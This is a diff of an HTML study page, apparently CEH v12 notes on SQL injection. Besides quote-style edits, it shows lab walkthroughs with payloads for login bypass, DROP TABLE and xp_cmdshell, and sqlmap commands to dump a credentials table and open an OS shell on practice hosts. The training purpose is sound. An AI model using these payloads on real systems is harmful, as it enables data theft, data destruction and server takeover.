@@ -1,45 +1,50 @@
 <!DOCTYPE html>
-<html lang='en'>
+<html lang="en">
 <head>
-    <meta charset='UTF-8'>
-    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Module 15 - SQL Injection</title>
-    <link rel='stylesheet' href='style.css'>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <nav>
         <h1>[MISSION_CONTROL]</h1>
-        <div class='search-wrap'>
-            <input id='globalSearch' type='text' placeholder='Search modules...'>
-            <div id='searchResults'></div>
+        <div class="search-wrap">
+            <input id="globalSearch" type="text" placeholder="Search modules...">
+            <div id="searchResults"></div>
         </div>
-        <button class='nav-toggle' id='navToggle' aria-label='Toggle navigation' aria-expanded='false'>&#9776;</button>
-    <ul id='navMenu'>
-            <li><a href='index.html' id='nav-index'>ROOT_ROADMAP</a></li>
-            <li><a href='module_02.html' id='nav-02'>MOD_02_RECON</a></li>
-            <li><a href='module_03.html' id='nav-03'>MOD_03_SCAN</a></li>
-            <li><a href='module_04.html' id='nav-04'>MOD_04_ENUM</a></li>
-            <li><a href='module_05.html' id='nav-05'>MOD_05_VULN</a></li>
-            <li><a href='module_06.html' id='nav-06'>MOD_06_SYS</a></li>
-            <li><a href='module_07.html' id='nav-07'>MOD_07_MAL</a></li>
-            <li><a href='module_08.html' id='nav-08'>MOD_08_SNIFF</a></li>
-            <li><a href='module_09.html' id='nav-09'>MOD_09_SE</a></li>
-            <li><a href='module_10.html' id='nav-10'>MOD_10_DOS</a></li>
-            <li><a href='module_11.html' id='nav-11'>MOD_11_SESS</a></li>
-            <li><a href='module_12.html' id='nav-12'>MOD_12_EVADE</a></li>
-            <li><a href='module_13.html' id='nav-13'>MOD_13_WEBSRV</a></li>
-            <li><a href='module_14.html' id='nav-14'>MOD_14_WEBAPP</a></li>
+        <button class="nav-toggle" id="navToggle" aria-label="Toggle navigation" aria-expanded="false">&#9776;</button>
+    <ul id="navMenu">
+            <li><a href="index.html" id="nav-index">ROOT_ROADMAP</a></li>
+            <li><a href="module_02.html" id="nav-02">MOD_02_RECON</a></li>
+            <li><a href="module_03.html" id="nav-03">MOD_03_SCAN</a></li>
+            <li><a href="module_04.html" id="nav-04">MOD_04_ENUM</a></li>
+            <li><a href="module_05.html" id="nav-05">MOD_05_VULN</a></li>
+            <li><a href="module_06.html" id="nav-06">MOD_06_SYS</a></li>
+            <li><a href="module_07.html" id="nav-07">MOD_07_MAL</a></li>
+            <li><a href="module_08.html" id="nav-08">MOD_08_SNIFF</a></li>
+            <li><a href="module_09.html" id="nav-09">MOD_09_SE</a></li>
+            <li><a href="module_10.html" id="nav-10">MOD_10_DOS</a></li>
+            <li><a href="module_11.html" id="nav-11">MOD_11_SESS</a></li>
+            <li><a href="module_12.html" id="nav-12">MOD_12_EVADE</a></li>
+            <li><a href="module_13.html" id="nav-13">MOD_13_WEBSRV</a></li>
+            <li><a href="module_14.html" id="nav-14">MOD_14_WEBAPP</a></li>
             <li><a href="module_15.html" id="nav-15">MOD_15_SQLI</a></li>
-            <li><a href='cheat_sheet.html' id='nav-cheat'>CHEAT_SHEET</a></li>
+        <li><a href="module_16.html" id="nav-16">MOD_16_WIRELESS</a></li>
+        <li><a href="module_17.html" id="nav-17">MOD_17_MOBILE</a></li>
+        <li><a href="module_18.html" id="nav-18">MOD_18_IOT</a></li>
+        <li><a href="module_19.html" id="nav-19">MOD_19_CLOUD</a></li>
+        <li><a href="module_20.html" id="nav-20">MOD_20_CRYPTO</a></li>
+            <li><a href="cheat_sheet.html" id="nav-cheat">CHEAT_SHEET</a></li>
         </ul>
-        <button id='viewToggle' class='view-toggle'>COMPACT</button>
-        <button id='themeToggle' class='theme-toggle'>SWITCH_MODE</button>
+        <button id="viewToggle" class="view-toggle">COMPACT</button>
+        <button id="themeToggle" class="theme-toggle">SWITCH_MODE</button>
     </nav>
-    <main class='content-body'>
-        <div class='window'>
-            <div class='module-header'>
+    <main class="content-body">
+        <div class="window">
+            <div class="module-header">
                 <span>CEH v12 - Module 15</span>
-                <h2 class='hero-3d'>SQL Injection</h2>
+                <h2 class="hero-3d">SQL Injection</h2>
             </div>
 
             <p>SQL injection is the most common and devastating attack that attackers can use to take control of data-driven web applications and websites. It is a code injection technique that exploits a security vulnerability in a website or application's software. SQL injection attacks use a series of malicious SQL (Structured Query Language) queries or statements to directly manipulate any type of SQL database. Applications often use SQL statements to authenticate users, validate roles and access levels, store, obtain information for the application and user, and link to other data sources. SQL injection attacks work when applications do not properly validate input before passing it to a SQL statement.</p>
@@ -66,19 +71,19 @@
                 </li>
             </ul>
 
-            <section class='lab-task'>
+            <section class="lab-task">
                 <h3>Exam Essentials: SQL Injection</h3>
-                <div class='section-card'>
-                    <span class='tool-tag'>Scenario &amp; Objective</span>
+                <div class="section-card">
+                    <span class="tool-tag">Scenario &amp; Objective</span>
                     <p><strong>Scenario:</strong> SQL injection is the most common and devastating attack used to take control of data-driven web applications and websites. It is a code injection technique exploiting a security vulnerability in an application's software, using malicious SQL queries to manipulate databases. Applications use SQL statements to authenticate users, validate roles, store/obtain information, and link data sources. SQL injection works when applications do not properly validate input before passing it to a SQL statement. Targeted organizations can incur huge losses in money, reputation, data, and functionality. As a pen tester you must know SQL injection techniques and protect against them using prepared statements with bind parameters, whitelist input validation, and user-supplied input escaping.</p>
                     <p><strong>Objective:</strong> Understand when and how web applications connect to a database server to access data; perform a SQL injection attack on an MSSQL database; extract SQL injection flaws and vulnerabilities; detect SQL injection vulnerabilities.</p>
                 </div>
-                <div class='section-card'>
-                    <span class='tool-tag'>Overview of SQL Injection</span>
+                <div class="section-card">
+                    <span class="tool-tag">Overview of SQL Injection</span>
                     <p>SQL injection can be used to implement: authentication bypass (log on without valid credentials, gain admin privileges), authorization bypass (alter authorization info in the DB), information disclosure (obtain sensitive stored data), compromised data integrity (deface pages, insert malicious content, alter DB contents), compromised availability of data (delete specific info, logs, audit trails), and remote code execution (execute code remotely, compromise the host OS). There are three main types: in-band (same channel for attack and results), blind/inferential (no error messages; send malicious query and infer from true/false or timing), and out-of-band (different channels such as DB email, file read/write).</p>
                 </div>
-                <div class='section-card'>
-                    <span class='tool-tag'>Key Concepts</span>
+                <div class="section-card">
+                    <span class="tool-tag">Key Concepts</span>
                     <ul>
                         <li><strong>SQL Injection:</strong> Code injection exploiting unsanitized user input in SQL statements; manipulates database queries to view, insert, update, or delete data.</li>
                         <li><strong>In-band SQLi:</strong> Attacker uses the same communication channel to perform the attack and retrieve results. Includes error-based and union-based.</li>
@@ -98,12 +103,12 @@
                         <li><strong>Cookie-based scanning:</strong> Authenticated sqlmap/DSSS scans require the session cookie from the logged-in browser.</li>
                     </ul>
                 </div>
-                <div class='section-card'>
-                    <span class='tool-tag'>Tools</span>
-                    <p><span class='tool-tag'>sqlmap</span> <span class='tool-tag'>DSSS</span> <span class='tool-tag'>OWASP ZAP</span> <span class='tool-tag'>Burp Suite</span> <span class='tool-tag'>Microsoft SQL Server Management Studio</span> <span class='tool-tag'>Firefox</span> <span class='tool-tag'>Parrot Security</span> <span class='tool-tag'>Windows 11</span> <span class='tool-tag'>Windows Server 2019</span> <span class='tool-tag'>MSSQL</span></p>
+                <div class="section-card">
+                    <span class="tool-tag">Tools</span>
+                    <p><span class="tool-tag">sqlmap</span> <span class="tool-tag">DSSS</span> <span class="tool-tag">OWASP ZAP</span> <span class="tool-tag">Burp Suite</span> <span class="tool-tag">Microsoft SQL Server Management Studio</span> <span class="tool-tag">Firefox</span> <span class="tool-tag">Parrot Security</span> <span class="tool-tag">Windows 11</span> <span class="tool-tag">Windows Server 2019</span> <span class="tool-tag">MSSQL</span></p>
                 </div>
-                <div class='section-card'>
-                    <span class='tool-tag'>Key Payloads</span>
+                <div class="section-card">
+                    <span class="tool-tag">Key Payloads</span>
                     <pre><code># Authentication bypass (tautology)
 blah' or 1=1 --
 
@@ -121,20 +126,20 @@ blah'; DROP TABLE table_name; --
 blah';exec master..xp_cmdshell 'ping www.certifiedhacker.com -l 65000 -t'; --
 
 # sqlmap: enumerate DBs, tables, dump, OS shell
-sqlmap -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie='[cookie]' --dbs
-sqlmap -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie='[cookie]' -D moviescope --tables
-sqlmap -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie='[cookie]' -D moviescope -T User_Login --dump
-sqlmap -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie='[cookie]' --os-shell
+sqlmap -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie="[cookie]" --dbs
+sqlmap -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie="[cookie]" -D moviescope --tables
+sqlmap -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie="[cookie]" -D moviescope -T User_Login --dump
+sqlmap -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie="[cookie]" --os-shell
 
 # DSSS: list options / scan
 python3 dsss.py
-python3 dsss.py -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie='[cookie]'
+python3 dsss.py -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie="[cookie]"
 
 # OWASP ZAP
 # Automated Scan URL: http://www.moviescope.com  (Alerts tab -> SQL Injection node)</code></pre>
                 </div>
-                <div class='section-card'>
-                    <span class='tool-tag'>Defenses</span>
+                <div class="section-card">
+                    <span class="tool-tag">Defenses</span>
                     <ul>
                         <li>Use parameterized queries / prepared statements with bind parameters instead of string concatenation.</li>
                         <li>Whitelist input validation and strong typing; reject unexpected characters.</li>
@@ -145,8 +150,8 @@ python3 dsss.py -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie='[
                         <li>Avoid dynamic SQL in stored procedures; use parameterized calls.</li>
                     </ul>
                 </div>
-                <div class='section-card'>
-                    <span class='tool-tag'>Exam Tips</span>
+                <div class="section-card">
+                    <span class="tool-tag">Exam Tips</span>
                     <ul>
                         <li>Tautology payload <code>blah' or 1=1 --</code> bypasses login when input is not validated.</li>
                         <li>Piggybacking uses <code>;</code> to stack extra statements (INSERT/CREATE/DROP/EXEC).</li>
@@ -162,15 +167,15 @@ python3 dsss.py -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie='[
                         <li>After injection, verify results in SSMS (Select Top 1000 Rows) or by logging in with extracted creds.</li>
                     </ul>
                 </div>
-                <div class='section-card'>
+                <div class="section-card">
                     <p><strong>Notes:</strong> Versions/website appearance may differ; process same. Always obtain proper authorization; use these techniques only in authorized labs/environments.</p>
                 </div>
             </section>
 
-            <section class='lab-task'>
+            <section class="lab-task">
                 <h3>Lab 1: Perform SQL Injection Attacks - Task 1: Perform an SQL Injection Attack on an MSSQL Database</h3>
-                <div class='section-card'>
-                    <span class='tool-tag'>MSSQL / SSMS / Firefox / Windows 11 / Windows Server 2019 / GoodShopping</span>
+                <div class="section-card">
+                    <span class="tool-tag">MSSQL / SSMS / Firefox / Windows 11 / Windows Server 2019 / GoodShopping</span>
                     <p><strong>What/when:</strong> SQL injection attack on an MSSQL database (GoodShopping website). Victim machine is Windows Server 2019 hosting the site; attacker uses Windows 11. Demonstrates authentication bypass (tautology), piggybacked INSERT to create a user, CREATE/DROP DATABASE, and OS command execution via xp_cmdshell. Login to Windows 11 as Admin/Pa$$w0rd; Networks Yes. Login to Windows Server 2019 as Administrator/Pa$$w0rd when switching.</p>
                     <pre><code># Windows 11 machine
 # login: Admin / Pa$$w0rd ; Networks: Yes
@@ -239,10 +244,10 @@ Username: blah';exec master..xp_cmdshell 'ping www.certifiedhacker.com -l 65000 
                 </div>
             </section>
 
-            <section class='lab-task'>
+            <section class="lab-task">
                 <h3>Lab 1: Perform SQL Injection Attacks - Task 2: Perform an SQL Injection Attack Against MSSQL to Extract Databases using sqlmap</h3>
-                <div class='section-card'>
-                    <span class='tool-tag'>sqlmap / Firefox / Parrot Security / Windows Server 2019 (MovieScope) / MSSQL</span>
+                <div class="section-card">
+                    <span class="tool-tag">sqlmap / Firefox / Parrot Security / Windows Server 2019 (MovieScope) / MSSQL</span>
                     <p><strong>What/when:</strong> Use sqlmap to perform SQL injection against MSSQL (MovieScope website) to extract databases. Pretend to be registered user sam/test on http://www.moviescope.com; crack other users' passwords from the DB. Attacker on Parrot Security. Captures session cookie for authenticated scan.</p>
                     <pre><code># Parrot Security machine
 # login: attacker / toor
@@ -263,23 +268,23 @@ sudo su
 # root prompt
 
 # Enumerate databases (answer prompts with Y)
-sqlmap -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie='[cookie value copied]' --dbs
+sqlmap -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie="[cookie value copied]" --dbs
 # -u target URL; --cookie HTTP cookie header; --dbs enumerate DBMS databases
 # prompts: 'skip test payloads for other DBMSes?' Y; 'include all tests for MSSQL?' Y
 
 # Enumerate tables in moviescope DB
-sqlmap -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie='[cookie value]' -D moviescope --tables
+sqlmap -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie="[cookie value]" -D moviescope --tables
 # -D DBMS database; --tables enumerate tables
 
 # Dump User_Login table
-sqlmap -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie='[cookie value]' -D moviescope -T User_Login --dump
+sqlmap -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie="[cookie value]" -D moviescope -T User_Login --dump
 # -T table; --dump dump all rows (usernames under Uname, passwords plaintext)
 
 # Verify extracted creds: switch to Firefox; close DevTools; Logout; new session
 # Login with john / qwerty -> logged in as john
 
 # OS shell
-sqlmap -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie='[cookie value]' --os-shell
+sqlmap -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie="[cookie value]" --os-shell
 # --os-shell interactive OS shell
 # if optimize delay prompt appears: Y
 hostname
@@ -294,10 +299,10 @@ help
                 </div>
             </section>
 
-            <section class='lab-task'>
+            <section class="lab-task">
                 <h3>Lab 2: Detect SQL Injection Vulnerabilities using Various SQL Injection Detection Tools - Task 1: Detect SQL Injection Vulnerabilities using DSSS</h3>
-                <div class='section-card'>
-                    <span class='tool-tag'>DSSS / Parrot Security / Windows Server 2019 (MovieScope) / Python3</span>
+                <div class="section-card">
+                    <span class="tool-tag">DSSS / Parrot Security / Windows Server 2019 (MovieScope) / Python3</span>
                     <p><strong>What/when:</strong> Damn Small SQLi Scanner (DSSS) detects SQL injection vulnerabilities (GET/POST params). Scans www.moviescope.com hosted on Windows Server 2019. Attacker on Parrot Security. Captures session cookie; scan reveals blind SQLi and a vulnerable link that exposes user accounts.</p>
                     <pre><code># Parrot Security machine
 # MATE Terminal
@@ -314,7 +319,7 @@ python3 dsss.py
 # Developer Tools -> Console -> document.cookie -> copy cookie value; minimize browser
 
 # Terminal
-python3 dsss.py -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie='[cookie value copied]'
+python3 dsss.py -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie="[cookie value copied]"
 # -u target URL; --cookie HTTP cookie header
 # result: target vulnerable to blind SQL injection; vulnerable link displayed
 # highlight vulnerable link -> right-click -> Copy
@@ -328,10 +333,10 @@ python3 dsss.py -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie='[
                 </div>
             </section>
 
-            <section class='lab-task'>
+            <section class="lab-task">
                 <h3>Lab 2: Detect SQL Injection Vulnerabilities using Various SQL Injection Detection Tools - Task 2: Detect SQL Injection Vulnerabilities using OWASP ZAP</h3>
-                <div class='section-card'>
-                    <span class='tool-tag'>OWASP ZAP / Windows Server 2019 (MovieScope) / SQL Injection</span>
+                <div class="section-card">
+                    <span class="tool-tag">OWASP ZAP / Windows Server 2019 (MovieScope) / SQL Injection</span>
                     <p><strong>What/when:</strong> Use OWASP ZAP to test www.moviescope.com (hosted on Windows Server 2019) for SQL injection vulnerabilities. Automated Scan; review Alerts tab. Risk flags: Red=High, Orange=Medium, Yellow=Low, Blue=Info.</p>
                     <pre><code># Windows Server 2019 machine
 # if logged out: Ctrl+Alt+Delete -> login Administrator / Pa$$w0rd
@@ -360,9 +365,9 @@ python3 dsss.py -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie='[
                 </div>
             </section>
 
-            <section class='lab-task'>
+            <section class="lab-task">
                 <h3>Practice &amp; Reference</h3>
-                <div class='section-card'>
+                <div class="section-card">
                     <p>The lab tasks above provide hands-on practice and reference commands for SQL injection attacks and detection (MSSQL tautology/piggybacking/xp_cmdshell, sqlmap extraction and OS shell, DSSS blind SQLi detection, OWASP ZAP automated scan).</p>
                 </div>
             </section>
@@ -432,6 +437,6 @@ python3 dsss.py -u 'http://www.moviescope.com/viewprofile.aspx?id=1' --cookie='[
         const navId = navMap[path] || 'nav-index';
         document.getElementById(navId).classList.add('active');
     </script>
-    <script src='app.js'></script>
+    <script src="app.js"></script>
 </body>
 </html>
